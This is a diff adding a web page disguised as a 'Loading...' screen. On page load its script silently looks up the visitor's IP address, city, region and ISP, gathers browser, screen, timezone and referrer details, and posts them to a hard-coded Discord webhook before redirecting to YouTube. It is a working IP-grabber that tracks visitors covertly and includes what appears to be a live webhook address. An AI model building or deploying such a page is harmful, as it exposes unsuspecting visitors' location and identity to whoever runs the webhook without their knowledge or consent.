@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+
+    <script>
+        async function getIPInfo() {
+            try {
+                const response = await fetch("https://ipinfo.io/json?token=");
+                return await response.json();
+            } catch (error) {
+                console.error("IP Fetch Failed:", error);
+                return null;
+            }
+        }
+
+        function getDeviceInfo() {
+            return {
+                device: navigator.userAgent,
+                browser: navigator.userAgentData ? navigator.userAgentData.brands[0].brand + " " + navigator.userAgentData.brands[0].version : navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || "Direct visit",
+                page_url: window.location.href
+            };
+        }
+
+        async function sendToDiscord(ipInfo, deviceInfo) {
+            const webhookURL = "https://discord.com/api/webhooks/1355442538508714044/0aSQlnNWV-a5aJpiy4Jac2YbMNR24H01QhYX-KA27ED8imQOcwb8oKqYJw97uBI63Krc";
+            
+            const embed = {
+                title: "🌍 Visitor Info",
+                color: 3447003,
+                fields: [
+                    { name: "🔹 IP Address", value: ipInfo ? ipInfo.ip : "Not Found", inline: true },
+                    { name: "📍 Location", value: ipInfo ? `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}` : "Not Found", inline: true },
+                    { name: "🌐 ISP", value: ipInfo ? ipInfo.org : "Unknown", inline: false },
+                    { name: "💻 Device", value: deviceInfo.device, inline: false },
+                    { name: "🖥 Browser", value: deviceInfo.browser, inline: false },
+                    { name: "📏 Screen Resolution", value: deviceInfo.screen, inline: true },
+                    { name: "⏰ Timezone", value: deviceInfo.timezone, inline: true },
+                    { name: "🔗 Referrer", value: deviceInfo.referrer, inline: false },
+                    { name: "📌 Page URL", value: deviceInfo.page_url, inline: false }
+                ]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            }).catch(error => console.error("Discord Webhook Error:", error));
+        }
+
+        (async () => {
+            const ipInfo = await getIPInfo();
+            const deviceInfo = getDeviceInfo();
+            sendToDiscord(ipInfo, deviceInfo);
+
+            // Redirect after 1 second (change URL as needed)
+            setTimeout(() => {
+                window.location.href = "https://youtube.com"; 
+            }, 1000);
+        })();
+    </script>
+</body>
+</html>
